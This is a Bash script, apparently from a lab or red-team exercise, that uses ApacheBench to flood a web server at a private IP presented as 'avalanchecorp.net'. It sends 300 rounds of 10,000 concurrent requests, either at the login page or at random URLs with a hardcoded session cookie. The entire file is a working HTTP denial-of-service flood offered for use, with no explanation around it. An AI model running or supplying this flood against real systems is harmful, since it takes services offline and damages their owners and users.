#!/bin/bash

IP="10.1.10.101"

USER_AGENT="user_agents.txt"

URLS="urls.txt"

REQ=300

get_random_line() {
        local file=$1
        shuf -n 1 "$file"
}

options=("one" "multiple")
select opt in "${options[@]}"

do
    case $opt in
            "one")
                    for i in $(seq 1 $REQ); do
                            RANDOM_AGENT=$(get_random_line "$USER_AGENT")
                            URL="http://$IP/login"
                            ab -l -r -n 10000 -c 1000 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H"Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US" "$URL"
                            #echo ""
                    done
                    break
                    ;;
            "multiple")
                    for i in $(seq 1 $REQ); do
                            RANDOM_AGENT=$(get_random_line "$USER_AGENT")
                            RANDOM_URL=$(get_random_line "$URLS")
                            URL="http://$IP$RANDOM_URL"
                            ab -l -r -n 10000 -c 1000 -d -C "connect.sid=s%3A1s0dGixKajpERWhnnEfIKC4GwIyqDK9u.4UMRCr4A96AAVPJccx6jwOsDDyoP5XqhOXmtNC6%2BvQQ" -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,applicationxml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US" "$URL"
                            echo ""
                    done
                    break
                    ;;
            *) echo "invalid" ;;
    esac
done